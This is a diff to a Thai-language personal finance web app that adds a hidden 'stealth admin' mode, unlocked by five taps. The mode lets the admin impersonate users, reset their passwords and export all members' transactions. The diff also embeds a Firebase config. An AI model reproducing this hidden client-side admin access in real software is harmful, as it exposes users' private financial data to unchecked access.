@@ -24,7 +24,7 @@
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
 
-    <!-- Chart.js CDN -->
+    <!-- Chart.js CDN for Spending Analytics -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 
     <!-- jsQR & Tesseract.js CDN for Real Bank Slip & PromptPay QR Parsing -->
@@ -32,6 +32,7 @@
     <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
 
     <style>
+        /* Global Typography & Touch Optimization */
         * {
             font-family: 'Plus Jakarta Sans', 'Noto Sans Thai', -apple-system, BlinkMacSystemFont, sans-serif;
             -webkit-tap-highlight-color: transparent;
@@ -47,8 +48,9 @@
             padding-bottom: max(6rem, env(safe-area-inset-bottom));
             overflow-x: hidden;
         }
+        /* Glassmorphism Cards & Modals */
         .glass-card {
-            background: rgba(15, 23, 42, 0.62);
+            background: rgba(15, 23, 42, 0.65);
             backdrop-filter: blur(22px);
             -webkit-backdrop-filter: blur(22px);
             border: 1px solid rgba(255, 255, 255, 0.08);
@@ -60,6 +62,7 @@
             -webkit-backdrop-filter: blur(28px);
             border: 1px solid rgba(255, 255, 255, 0.12);
         }
+        /* Fintech 2026 Hero Balance Card */
         .fintech-hero-card {
             background: linear-gradient(135deg, #4f46e5 0%, #9333ea 48%, #db2777 100%);
             box-shadow:
@@ -81,11 +84,27 @@
 </head>
 <body class="min-h-screen selection:bg-indigo-500 selection:text-white">
 
-    <!-- Global Toast Notification (Replaces native alert()) -->
+    <!-- Global Toast Notification Banner (Replaces native alert()) -->
     <div id="toastBanner" class="fixed top-5 left-1/2 -translate-x-1/2 z-[260] transform -translate-y-32 opacity-0 transition-all duration-300 pointer-events-none w-[92%] max-w-sm">
         <div class="glass-modal px-4 py-3 rounded-2xl shadow-2xl flex items-center space-x-3 border border-indigo-500/40">
             <span id="toastIcon" class="text-xl shrink-0">✅</span>
             <span id="toastMessage" class="text-xs sm:text-sm font-medium text-white leading-snug">แจ้งเตือนระบบ</span>
+        </div>
+    </div>
+
+    <!-- ADMIN IMPERSONATION BANNER (Visible ONLY when Admin is inspecting a user's account) -->
+    <div id="adminImpersonationBanner" class="hidden sticky top-2 z-[105] max-w-md md:max-w-2xl mx-auto px-4 mb-3">
+        <div class="bg-amber-500/20 backdrop-blur-xl border border-amber-400/50 rounded-2xl px-4 py-2.5 shadow-xl flex items-center justify-between gap-2">
+            <div class="flex items-center space-x-2 min-w-0">
+                <span class="text-base shrink-0">👁️</span>
+                <p id="impersonationBannerText" class="text-xs font-semibold text-amber-200 truncate">
+                    กำลังเข้าดูบัญชีผู้ใช้
+                </p>
+            </div>
+            <button type="button" onclick="exitImpersonationToAdmin()"
+                class="px-3 py-1.5 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs shrink-0 shadow transition active:scale-95 cursor-pointer">
+                🔙 กลับสู่โหมดแอดมิน
+            </button>
         </div>
     </div>
 
@@ -108,11 +127,11 @@
                             class="text-base sm:text-xl font-extrabold tracking-tight text-white cursor-pointer select-none active:scale-95 transition truncate">
                             My wallet
                         </h1>
-                        <!-- Admin Badge (Visible ONLY to Admin / Stealth Admin) -->
-                        <span id="stealthAdminBadge" onclick="openAdminModal()"
-                            class="hidden px-2 py-0.5 text-[10px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40 rounded-full cursor-pointer shrink-0">
-                            🛡️ Admin
-                        </span>
+                        <!-- ADMIN-ONLY Shortcut Pill (1-Tap Re-entry to Admin Control Panel) -->
+                        <button type="button" id="stealthAdminBadge" onclick="openAdminModal()"
+                            class="hidden px-2.5 py-0.5 text-[11px] font-bold bg-amber-500/20 hover:bg-amber-500/35 text-amber-300 border border-amber-500/45 rounded-full cursor-pointer shrink-0 transition active:scale-95">
+                            🛡️ แผงแอดมิน
+                        </button>
                     </div>
                     <p id="userSubtitleText" class="text-[11px] sm:text-xs text-slate-400 truncate">สถานะ: ยังไม่ได้เข้าสู่ระบบ</p>
                 </div>
@@ -120,11 +139,11 @@
 
             <!-- Right Action Controls -->
             <div class="flex items-center space-x-1.5 shrink-0">
-                <!-- ADMIN-ONLY Cloud Sync Status Pill (100% Hidden from regular users & logged-out screens) -->
+                <!-- ADMIN-ONLY Cloud Sync Status Pill (100% Hidden from regular users) -->
                 <button type="button" id="adminCloudSyncPill" onclick="openAdminModal(true)" title="จัดการการซิงค์ Firebase Cloud (เฉพาะแอดมิน)"
                     class="hidden px-2.5 py-2 rounded-xl bg-slate-800/90 hover:bg-slate-700 border border-slate-700 text-slate-300 text-[11px] font-semibold items-center space-x-1 transition active:scale-95 cursor-pointer">
                     <span id="cloudSyncDotIcon">⚪</span>
-                    <span id="cloudSyncLabelText">โหมดในเครื่อง</span>
+                    <span id="cloudSyncLabelText" class="hidden sm:inline">โหมดในเครื่อง</span>
                 </button>
 
                 <!-- Desktop & Mobile PWA Install Button -->
@@ -196,8 +215,9 @@
 
         <!-- Monthly Budget Limit & Dynamic Alert Bar -->
         <section class="glass-card rounded-3xl p-4 sm:p-5 relative overflow-hidden">
+            <!-- Auth Gate Lock Overlay -->
             <div id="budgetLockOverlay" onclick="openAuthModal('login')"
-                class="absolute inset-0 z-10 bg-slate-950/82 backdrop-blur-[3px] flex items-center justify-center cursor-pointer">
+                class="absolute inset-0 z-10 bg-slate-950/85 backdrop-blur-[3px] flex items-center justify-center cursor-pointer">
                 <span class="text-xs font-semibold text-indigo-300 bg-slate-900/95 border border-indigo-500/35 px-3.5 py-2 rounded-xl shadow">
                     🔒 กรุณาเข้าสู่ระบบก่อนใช้งานงบประมาณ
                 </span>
@@ -223,8 +243,9 @@
 
         <!-- 1-Tap Quick Add Section -->
         <section class="glass-card rounded-3xl p-4 sm:p-5 relative overflow-hidden">
+            <!-- Auth Gate Lock Overlay -->
             <div id="quickAddLockOverlay" onclick="openAuthModal('login')"
-                class="absolute inset-0 z-10 bg-slate-950/82 backdrop-blur-[3px] flex items-center justify-center cursor-pointer">
+                class="absolute inset-0 z-10 bg-slate-950/85 backdrop-blur-[3px] flex items-center justify-center cursor-pointer">
                 <span class="text-xs font-semibold text-indigo-300 bg-slate-900/95 border border-indigo-500/35 px-3.5 py-2 rounded-xl shadow">
                     🔒 กรุณาเข้าสู่ระบบก่อนใช้งานปุ่มด่วน 1-Tap
                 </span>
@@ -248,15 +269,15 @@
 
         <!-- Add Transaction Form & Slip Scanner -->
         <section class="glass-card rounded-3xl p-5 relative overflow-hidden">
-            <!-- 100% Permission Lock Overlay when NOT logged in -->
+            <!-- Primary Auth Gate Lock Overlay when NOT logged in -->
             <div id="mainFormLockOverlay"
-                class="absolute inset-0 z-20 bg-slate-950/90 backdrop-blur-md flex flex-col items-center justify-center p-6 text-center select-none">
+                class="absolute inset-0 z-20 bg-slate-950/92 backdrop-blur-md flex flex-col items-center justify-center p-6 text-center select-none">
                 <div class="w-14 h-14 rounded-2xl bg-indigo-500/20 border border-indigo-500/40 flex items-center justify-center text-3xl mb-3 shadow-lg">
                     🔒
                 </div>
                 <h4 class="text-base font-bold text-white mb-1">🔒 กรุณาเข้าสู่ระบบก่อนใช้งาน</h4>
                 <p class="text-xs text-slate-300 max-w-xs mb-4 leading-relaxed">
-                    ระบบล็อกการบันทึกรายการและสแกนสลิปไว้ ข้อมูลของคุณจะถูกเก็บรักษาแยกบัญชีและปลอดภัย 100%
+                    ระบบล็อกการบันทึกรายการและสแกนสลิปไว้ ข้อมูลของคุณจะถูกเก็บรักษาแยกบัญชีและซิงค์ข้ามอุปกรณ์อย่างปลอดภัย 100%
                 </p>
                 <button type="button" onclick="openAuthModal('login')"
                     class="px-6 py-3 rounded-2xl bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white text-xs font-semibold shadow-lg transition active:scale-95 cursor-pointer">
@@ -322,8 +343,9 @@
 
         <!-- Savings Goals Tracker -->
         <section class="glass-card rounded-3xl p-5 relative overflow-hidden">
+            <!-- Auth Gate Lock Overlay -->
             <div id="goalsLockOverlay" onclick="openAuthModal('login')"
-                class="absolute inset-0 z-10 bg-slate-950/82 backdrop-blur-[3px] flex items-center justify-center cursor-pointer">
+                class="absolute inset-0 z-10 bg-slate-950/85 backdrop-blur-[3px] flex items-center justify-center cursor-pointer">
                 <span class="text-xs font-semibold text-indigo-300 bg-slate-900/95 border border-indigo-500/35 px-3.5 py-2 rounded-xl shadow">
                     🔒 กรุณาเข้าสู่ระบบก่อนใช้งานเป้าหมายการออม
                 </span>
@@ -423,7 +445,7 @@
     </div>
 
     <!-- =================================================================== -->
-    <!-- MODAL 1: Login & Register Modal (Clean User Experience)             -->
+    <!-- MODAL 1: Login & Register Modal                                     -->
     <!-- =================================================================== -->
     <div id="authModal" class="fixed inset-0 bg-black/80 backdrop-blur-md z-[110] hidden flex items-center justify-center p-4">
         <div class="glass-modal rounded-3xl max-w-sm w-full p-6 space-y-4 border border-white/15 shadow-2xl max-h-[92vh] overflow-y-auto custom-scrollbar">
@@ -431,6 +453,18 @@
                 <h2 id="authModalHeading" class="text-lg font-bold text-white">เข้าสู่ระบบ My wallet</h2>
                 <button type="button" onclick="closeModalById('authModal')"
                     class="w-8 h-8 rounded-full bg-slate-800 text-slate-400 hover:text-white flex items-center justify-center text-sm cursor-pointer">✕</button>
+            </div>
+
+            <!-- STEALTH ADMIN QUICK LOGIN CTA (Shown ONLY after Stealth Admin 5-tap unlock) -->
+            <div id="stealthAdminQuickLoginBox" class="hidden bg-amber-500/15 border border-amber-500/40 rounded-2xl p-3 flex items-center justify-between gap-2">
+                <div>
+                    <p class="text-xs font-bold text-amber-300">🛡️ ปลดล็อกสิทธิ์แอดมินแล้ว</p>
+                    <p class="text-[10px] text-amber-200/80">เข้าสู่ระบบแอดมินและเปิดแผงควบคุมทันที</p>
+                </div>
+                <button type="button" onclick="handleQuickAdminLogin()"
+                    class="px-3 py-2 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs shrink-0 shadow transition active:scale-95 cursor-pointer">
+                    ⚡ เข้าสู่ระบบแอดมินด่วน
+                </button>
             </div>
 
             <!-- Mode Tabs -->
@@ -459,7 +493,7 @@
             <form id="authAccountForm" onsubmit="handleAuthFormSubmit(event)" class="space-y-3" novalidate>
                 <div id="registerDisplayNameGroup" class="hidden">
                     <label class="block text-xs text-slate-300 mb-1">ชื่อผู้ใช้ / นามแฝง</label>
-                    <input type="text" id="authDisplayNameInput" placeholder="เช่น เบสท์ หรือ สมชาย สายออม"
+                    <input type="text" id="authDisplayNameInput" placeholder="เช่น นนท์ หรือ พลอย สายออม"
                         class="w-full bg-slate-900 border border-slate-700 rounded-2xl px-4 py-2.5 text-white text-sm focus:outline-none focus:border-indigo-500">
                 </div>
 
@@ -544,10 +578,10 @@
                 <span class="text-lg shrink-0">🛡️</span>
                 <div>
                     <p class="text-xs font-semibold text-emerald-300 leading-snug">
-                        ระบบปกป้องฐานข้อมูลอัตโนมัติ (Auto-Sync & Backup)
+                        ระบบปกป้องฐานข้อมูลอัตโนมัติ (Auto-Sync & Backup 24/7)
                     </p>
                     <p class="text-[10px] text-emerald-200/75 mt-0.5">
-                        ข้อมูลบัญชีและธุรกรรมของคุณถูกจัดเก็บและซิงค์อย่างปลอดภัย
+                        ข้อมูลบัญชีและธุรกรรมของคุณถูกจัดเก็บและซิงค์ข้ามอุปกรณ์ตลอด 24 ชั่วโมง
                     </p>
                 </div>
             </div>
@@ -692,7 +726,7 @@
 
             <!-- Slip Thumbnail & Live Scan Progress -->
             <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-3 flex items-center space-x-3">
-                <img id="slipThumbPreview" src="" alt="Slip Thumbnail" class="w-16 h-20 object-cover rounded-xl border border-slate-700 shrink-0">
+                <img id="slipThumbPreview" src="" alt="Slip Thumbnail" class="w-16 h-20 object-cover rounded-xl border border-slate-700 shrink-0 hidden">
                 <div class="space-y-1 min-w-0 flex-1">
                     <span id="slipDetectionStatusBadge"
                         class="inline-block px-2 py-0.5 rounded-full text-[10px] font-semibold bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
@@ -870,7 +904,7 @@
         <div class="glass-modal rounded-3xl max-w-md w-full p-6 space-y-4 border border-emerald-500/35 shadow-2xl max-h-[92vh] overflow-y-auto custom-scrollbar">
             <div class="flex justify-between items-center">
                 <div class="flex items-center space-x-2.5">
-                    <img id="installGuideAppLogo" src="" alt="My wallet Icon" class="w-10 h-10 rounded-2xl border border-indigo-400/40 shadow">
+                    <img id="installGuideAppLogo" src="" alt="My wallet Icon" class="w-10 h-10 rounded-2xl border border-indigo-400/40 shadow hidden">
                     <div>
                         <h3 class="text-base font-bold text-white">ติดตั้ง My wallet ลงหน้าจอ</h3>
                         <p class="text-[11px] text-emerald-300">เปิดใช้งานเป็นแอปเดี่ยวบน Desktop & มือถือ</p>
@@ -945,36 +979,63 @@
     </div>
 
     <!-- =================================================================== -->
-    <!-- MODAL 9: Stealth Admin Control Panel (Includes Cloud Sync & Reset)  -->
+    <!-- MODAL 9: Upgraded Stealth Admin Control Panel                       -->
     <!-- =================================================================== -->
     <div id="adminControlModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-[135] hidden flex items-center justify-center p-4">
-        <div class="glass-modal rounded-3xl max-w-lg w-full p-6 space-y-4 border border-amber-500/40 max-h-[92vh] overflow-y-auto custom-scrollbar shadow-2xl">
+        <div class="glass-modal rounded-3xl max-w-xl w-full p-5 sm:p-6 space-y-4 border border-amber-500/40 max-h-[92vh] overflow-y-auto custom-scrollbar shadow-2xl">
             <div class="flex justify-between items-center border-b border-slate-800 pb-3">
-                <div class="flex items-center space-x-2">
-                    <span class="text-xl">🛡️</span>
+                <div class="flex items-center space-x-2.5">
+                    <span class="text-2xl">🛡️</span>
                     <div>
-                        <h2 class="text-base font-bold text-white">Stealth Admin Control Panel</h2>
-                        <p class="text-[11px] text-amber-300/85">จัดการ Firebase Cloud Sync ตรวจสอบสมาชิก และรีเซ็ตฐานข้อมูล</p>
+                        <h2 class="text-base sm:text-lg font-bold text-white">Stealth Admin Control Panel</h2>
+                        <p class="text-[11px] text-amber-300/85">จัดการสมาชิก เข้าดูบัญชี เปลี่ยนรหัสผ่าน สำรองทั้งระบบ และซิงค์ 24/7</p>
                     </div>
                 </div>
                 <button type="button" onclick="closeModalById('adminControlModal')"
                     class="w-8 h-8 rounded-full bg-slate-800 text-slate-400 hover:text-white flex items-center justify-center text-sm cursor-pointer">✕</button>
             </div>
 
-            <!-- Admin Quick Telemetry Cards -->
-            <div class="grid grid-cols-3 gap-2 text-center">
+            <!-- 4-Card System Telemetry Overview -->
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-center">
                 <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-2.5">
                     <p class="text-[10px] text-slate-400">สมาชิกทั้งหมด</p>
-                    <p id="adminTotalUsersCount" class="text-base font-bold text-white tabular-nums">0</p>
+                    <p id="adminTotalUsersCount" class="text-base font-extrabold text-white tabular-nums mt-0.5">0</p>
                 </div>
                 <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-2.5">
-                    <p class="text-[10px] text-slate-400">Dual-Sync Health</p>
-                    <p id="adminSyncHealthStatus" class="text-xs font-bold text-emerald-400 mt-1">Healthy ✓</p>
+                    <p class="text-[10px] text-slate-400">ธุรกรรมรวมทุกบัญชี</p>
+                    <p id="adminTotalTxCount" class="text-base font-extrabold text-indigo-300 tabular-nums mt-0.5">0</p>
                 </div>
                 <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-2.5">
-                    <p class="text-[10px] text-slate-400">Cloud Firestore</p>
+                    <p class="text-[10px] text-slate-400">ยอดรวมสุทธิทั้งระบบ</p>
+                    <p id="adminSystemNetBalance" class="text-sm font-extrabold text-emerald-300 tabular-nums mt-1 truncate">฿0.00</p>
+                </div>
+                <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-2.5">
+                    <p class="text-[10px] text-slate-400">ซิงค์ Real-Time 24/7</p>
                     <p id="adminCloudStatusText" class="text-xs font-bold text-slate-400 mt-1">โหมดในเครื่อง</p>
                 </div>
+            </div>
+
+            <!-- Full System Backup Action Bar -->
+            <div class="flex flex-wrap items-center justify-between gap-2 bg-slate-900/80 border border-indigo-500/25 rounded-2xl p-3">
+                <div>
+                    <p class="text-xs font-bold text-white">📦 สำรองข้อมูลสมาชิกและธุรกรรมทั้งระบบ</p>
+                    <p class="text-[10px] text-slate-400">ดาวน์โหลดโปรไฟล์สมาชิกและรายการธุรกรรมของทุกคนเก็บไว้ในไฟล์เดียว</p>
+                </div>
+                <button type="button" onclick="exportFullSystemBackupAdmin()"
+                    class="px-3.5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold shadow transition active:scale-95 cursor-pointer shrink-0">
+                    📤 สำรองข้อมูลทั้งระบบ (.json)
+                </button>
+            </div>
+
+            <!-- Individual User Management Section with Instant Search -->
+            <div class="space-y-2.5">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                    <h3 class="text-xs font-bold text-slate-200 uppercase tracking-wider">👥 จัดการผู้ใช้งานรายบุคคล (Real-Time 24/7)</h3>
+                    <input type="text" id="adminUserSearchInput" oninput="renderAdminUsersList()"
+                        placeholder="🔍 ค้นหาชื่อหรืออีเมลสมาชิก..."
+                        class="w-full sm:w-56 bg-slate-900 border border-slate-700 rounded-xl px-3 py-1.5 text-xs text-white focus:outline-none focus:border-amber-400">
+                </div>
+                <div id="adminRegisteredUsersContainer" class="space-y-2.5 max-h-60 overflow-y-auto custom-scrollbar pr-1"></div>
             </div>
 
             <!-- ADMIN-ONLY: Firebase Cloud Firestore Sync Configuration Section -->
@@ -983,9 +1044,9 @@
                     <div class="flex items-center space-x-2">
                         <span class="text-lg">☁️</span>
                         <div>
-                            <h3 class="text-xs sm:text-sm font-bold text-white">Firebase Cloud Sync (เฉพาะแอดมิน)</h3>
+                            <h3 class="text-xs sm:text-sm font-bold text-white">Firebase Cloud Sync 24/7 (เฉพาะแอดมิน)</h3>
                             <p id="cloudModalProjectInfo" class="text-[10px] text-slate-400">
-                                เชื่อมต่อครั้งเดียว ระบบจะซิงค์ข้อมูลให้ผู้ใช้ทุกคนในเบื้องหลังอัตโนมัติ
+                                วางโค้ดทั้งชุดจาก Firebase Console ระบบจะแยกคีย์และซิงค์อัตโนมัติ
                             </p>
                         </div>
                     </div>
@@ -998,13 +1059,19 @@
                 <div id="cloudModalErrorAlert" class="hidden p-2.5 rounded-xl bg-rose-500/15 border border-rose-500/40 text-rose-200 text-[11px] leading-relaxed"></div>
 
                 <textarea id="firebaseConfigTextarea" rows="4" spellcheck="false"
-                    placeholder='วางโค้ด const firebaseConfig = { apiKey: "...", projectId: "...", ... }; ที่นี่'
+                    placeholder='วางโค้ดทั้งชุดจาก Firebase Console (เช่น import ... const firebaseConfig = { apiKey: "...", projectId: "...", ... };) ที่นี่'
                     class="w-full bg-slate-950 border border-slate-700/90 rounded-xl p-2.5 text-[11px] font-mono text-sky-200 focus:outline-none focus:border-sky-500 custom-scrollbar"></textarea>
 
-                <button type="button" id="connectFirebaseBtn" onclick="handleSaveAndConnectFirebase()"
-                    class="w-full py-2.5 rounded-xl bg-gradient-to-r from-sky-600 to-indigo-600 hover:from-sky-500 hover:to-indigo-500 text-white font-semibold text-xs shadow-lg transition active:scale-[0.98] cursor-pointer">
-                    🔗 เชื่อมต่อและเริ่มซิงค์ Cloud ทันที
-                </button>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                    <button type="button" id="connectFirebaseBtn" onclick="handleSaveAndConnectFirebase()"
+                        class="py-2.5 px-3 rounded-xl bg-gradient-to-r from-sky-600 to-indigo-600 hover:from-sky-500 hover:to-indigo-500 text-white font-semibold text-xs shadow-lg transition active:scale-[0.98] cursor-pointer">
+                        🔗 เชื่อมต่อและเปิดซิงค์ 24/7
+                    </button>
+                    <button type="button" onclick="copyFirebaseEmbedSnippet()"
+                        class="py-2.5 px-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-600 text-sky-200 text-xs font-semibold transition active:scale-[0.98] cursor-pointer">
+                        📋 คัดลอกโค้ดฝัง index.html
+                    </button>
+                </div>
 
                 <div id="cloudConnectedActionsGroup" class="hidden grid grid-cols-2 gap-2 pt-1">
                     <button type="button" onclick="triggerManualCloudSync()"
@@ -1016,12 +1083,6 @@
                         🔌 ตัดการเชื่อมต่อ Cloud
                     </button>
                 </div>
-            </div>
-
-            <!-- Registered Users List (Encrypted Passwords - Never Shows Plaintext) -->
-            <div class="space-y-2">
-                <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider">👥 รายชื่อบัญชีในระบบ (เข้ารหัส - ไม่แสดงรหัสผ่านจริง)</h3>
-                <div id="adminRegisteredUsersContainer" class="space-y-2 max-h-48 overflow-y-auto custom-scrollbar pr-1"></div>
             </div>
 
             <!-- Admin Global Reset Actions -->
@@ -1039,7 +1100,40 @@
     </div>
 
     <!-- =================================================================== -->
-    <!-- MODAL 10: Custom Confirmation Modal (Replaces native confirm())     -->
+    <!-- MODAL 10: Admin Change User Password Modal (No native prompt)       -->
+    <!-- =================================================================== -->
+    <div id="adminChangePasswordModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-[150] hidden flex items-center justify-center p-4">
+        <div class="glass-modal rounded-3xl max-w-xs w-full p-6 space-y-4 border border-amber-500/40 shadow-2xl">
+            <div class="flex justify-between items-center">
+                <h3 class="text-base font-bold text-white">🔑 เปลี่ยนรหัสผ่านสมาชิก</h3>
+                <button type="button" onclick="closeModalById('adminChangePasswordModal')"
+                    class="w-8 h-8 rounded-full bg-slate-800 text-slate-400 hover:text-white flex items-center justify-center text-sm cursor-pointer">✕</button>
+            </div>
+            <p id="adminChangePwTargetLabel" class="text-xs text-amber-300 bg-amber-500/10 border border-amber-500/25 rounded-xl px-3 py-2">
+                บัญชี: -
+            </p>
+            <form onsubmit="handleAdminSaveUserPassword(event)" class="space-y-3" novalidate>
+                <input type="hidden" id="adminChangePwEmailField">
+                <div>
+                    <div class="flex justify-between items-center mb-1">
+                        <label class="block text-xs text-slate-300">รหัสผ่านใหม่ (อย่างน้อย 4 ตัวอักษร)</label>
+                        <button type="button" onclick="toggleAdminNewPwField()" class="text-[11px] text-indigo-400 cursor-pointer">👁️ แสดง/ซ่อน</button>
+                    </div>
+                    <input type="password" id="adminChangePwNewInput" minlength="4" placeholder="กรอกรหัสผ่านใหม่"
+                        class="w-full bg-slate-900 border border-slate-700 rounded-2xl px-4 py-2.5 text-white text-sm focus:outline-none focus:border-amber-400">
+                </div>
+                <div class="grid grid-cols-2 gap-2 pt-1">
+                    <button type="button" onclick="closeModalById('adminChangePasswordModal')"
+                        class="py-2.5 rounded-xl bg-slate-800 text-slate-300 text-xs font-semibold cursor-pointer">ยกเลิก</button>
+                    <button type="submit"
+                        class="py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs shadow cursor-pointer">บันทึกรหัสผ่าน</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- =================================================================== -->
+    <!-- MODAL 11: Custom Confirmation Modal (Replaces native confirm())     -->
     <!-- =================================================================== -->
     <div id="customConfirmModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-[160] hidden flex items-center justify-center p-4">
         <div class="glass-modal rounded-3xl max-w-xs w-full p-6 space-y-4 border border-rose-500/35 text-center shadow-2xl">
@@ -1062,7 +1156,7 @@
     </div>
 
     <!-- =================================================================== -->
-    <!-- MODAL 11: 6-Digit PIN Lock Screen Overlay                           -->
+    <!-- MODAL 12: 6-Digit PIN Lock Screen Overlay                           -->
     <!-- =================================================================== -->
     <div id="pinLockScreenOverlay" class="fixed inset-0 bg-slate-950/98 backdrop-blur-2xl z-[200] hidden flex flex-col items-center justify-center p-6 text-center">
         <div class="w-16 h-16 rounded-3xl bg-indigo-500/20 border border-indigo-500/40 flex items-center justify-center text-3xl mb-4 shadow-lg">🔐</div>
@@ -1115,6 +1209,8 @@
         // =========================================================================
         const PRESYNC_RESET_FLAG_KEY = 'mywallet_presync_reset_v2026_clean';
 
+        // Default Firebase Configuration for Project 'my-wallet-62adf'
+        // (Admin can paste full config in Stealth Admin Panel and copy snippet to embed here)
         const DEFAULT_FIREBASE_CONFIG = {
             apiKey: "AIzaSyDUshlfqkoQ2QWKFwUE9abI5",
             authDomain: "my-wallet-62adf.firebaseapp.com",
@@ -1131,7 +1227,219 @@
             USER_DATA_PREFIX: 'mywallet_user_data_',
             FIREBASE_CONFIG: 'mywallet_firebase_config'
         };
-// ... existing code ... -->
+
+        const IDB_NAME = 'MyWalletDB';
+        const IDB_STORE = 'kv_store';
+
+        function openIndexedDB() {
+            return new Promise((resolve) => {
+                if (!window.indexedDB) return resolve(null);
+                try {
+                    const req = indexedDB.open(IDB_NAME, 1);
+                    req.onupgradeneeded = (e) => {
+                        const db = e.target.result;
+                        if (!db.objectStoreNames.contains(IDB_STORE)) {
+                            db.createObjectStore(IDB_STORE);
+                        }
+                    };
+                    req.onsuccess = () => resolve(req.result);
+                    req.onerror = () => resolve(null);
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        async function idbGet(key) {
+            const db = await openIndexedDB();
+            if (!db) return null;
+            return new Promise((resolve) => {
+                try {
+                    const tx = db.transaction(IDB_STORE, 'readonly');
+                    const req = tx.objectStore(IDB_STORE).get(key);
+                    req.onsuccess = () => resolve(req.result !== undefined ? req.result : null);
+                    req.onerror = () => resolve(null);
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        async function idbSet(key, val) {
+            const db = await openIndexedDB();
+            if (!db) return;
+            return new Promise((resolve) => {
+                try {
+                    const tx = db.transaction(IDB_STORE, 'readwrite');
+                    tx.objectStore(IDB_STORE).put(val, key);
+                    tx.oncomplete = () => resolve();
+                    tx.onerror = () => resolve();
+                } catch (e) {
+                    resolve();
+                }
+            });
+        }
+
+        async function idbDelete(key) {
+            const db = await openIndexedDB();
+            if (!db) return;
+            return new Promise((resolve) => {
+                try {
+                    const tx = db.transaction(IDB_STORE, 'readwrite');
+                    tx.objectStore(IDB_STORE).delete(key);
+                    tx.oncomplete = () => resolve();
+                    tx.onerror = () => resolve();
+                } catch (e) {
+                    resolve();
+                }
+            });
+        }
+
+        async function dualSave(key, value) {
+            try {
+                window.localStorage.setItem(key, JSON.stringify(value));
+            } catch (e) {}
+            await idbSet(key, value);
+        }
+
+        async function dualLoadWithRestore(key) {
+            let lsVal = null;
+            try {
+                const raw = window.localStorage.getItem(key);
+                if (raw !== null) lsVal = JSON.parse(raw);
+            } catch (e) {}
+            if (lsVal !== null) return lsVal;
+
+            const idbVal = await idbGet(key);
+            if (idbVal !== null) {
+                try {
+                    window.localStorage.setItem(key, JSON.stringify(idbVal));
+                } catch (e) {}
+                return idbVal;
+            }
+            return null;
+        }
+
+        async function performOneTimeCleanResetIfNeeded() {
+            const alreadyReset = window.localStorage.getItem(PRESYNC_RESET_FLAG_KEY);
+            if (alreadyReset === '1') return;
+
+            const toDelete = [];
+            for (let i = 0; i < window.localStorage.length; i++) {
+                const k = window.localStorage.key(i);
+                if (k && (k.startsWith('mywallet_') || k.startsWith('my_wallet_'))) {
+                    toDelete.push(k);
+                }
+            }
+            toDelete.forEach(k => window.localStorage.removeItem(k));
+            try {
+                if (window.indexedDB) indexedDB.deleteDatabase(IDB_NAME);
+            } catch (e) {}
+            window.localStorage.setItem(PRESYNC_RESET_FLAG_KEY, '1');
+        }
+
+        // =========================================================================
+        // 2. APPLICATION STATE & CONSTANTS
+        // =========================================================================
+        const CATEGORIES = {
+            expense: [
+                { id: 'food', label: '🍱 อาหารและเครื่องดื่ม' },
+                { id: 'transport', label: '🚆 ค่าเดินทาง / น้ำมัน' },
+                { id: 'shopping', label: '🛍️ ช้อปปิ้ง / ของใช้' },
+                { id: 'bills', label: '🧾 ค่าน้ำ / ค่าไฟ / อินเทอร์เน็ต' },
+                { id: 'health', label: '💊 สุขภาพ / ยา' },
+                { id: 'entertainment', label: '🎬 บันเทิง / ท่องเที่ยว' },
+                { id: 'other_exp', label: '📦 รายจ่ายอื่นๆ' }
+            ],
+            income: [
+                { id: 'salary', label: '💼 เงินเดือน / ค่าจ้าง' },
+                { id: 'bonus', label: '🎁 โบนัส / ค่าคอมมิชชั่น' },
+                { id: 'business', label: '📈 ขายของ / ธุรกิจ' },
+                { id: 'invest', label: '💎 เงินปันผล / การลงทุน' },
+                { id: 'other_inc', label: '💰 รายรับอื่นๆ' }
+            ]
+        };
+
+        const DEFAULT_QUICK_BUTTONS = [
+            { id: 'qb1', emoji: '☕', label: 'กาแฟ', amount: 60, type: 'expense', category: 'food' },
+            { id: 'qb2', emoji: '🚆', label: 'ค่าเดินทาง', amount: 40, type: 'expense', category: 'transport' },
+            { id: 'qb3', emoji: '🍱', label: 'ค่าอาหาร', amount: 80, type: 'expense', category: 'food' }
+        ];
+
+        const appState = {
+            isLoggedIn: false,
+            currentUser: null,
+            usersRegistry: {},
+            adminUsersWalletCache: {},
+            userData: createEmptyWalletData(),
+            privacyMode: false,
+            newTxType: 'expense',
+            editTxType: 'expense',
+            slipVerifyType: 'expense',
+            authModalTab: 'login',
+            chartType: 'doughnut',
+            chartInstance: null,
+            isStealthAdmin: false,
+            isImpersonating: false,
+            stealthTapCount: 0,
+            stealthTapTimer: null,
+            firebaseConfig: null,
+            cloudStatus: 'local',
+            cloudErrorMsg: '',
+            lastSyncTimeStr: '',
+            pendingConfirmAction: null,
+            pendingConfirmPayload: null,
+            deferredInstallPrompt: null,
+            notFoundEmailCandidate: ''
+        };
+
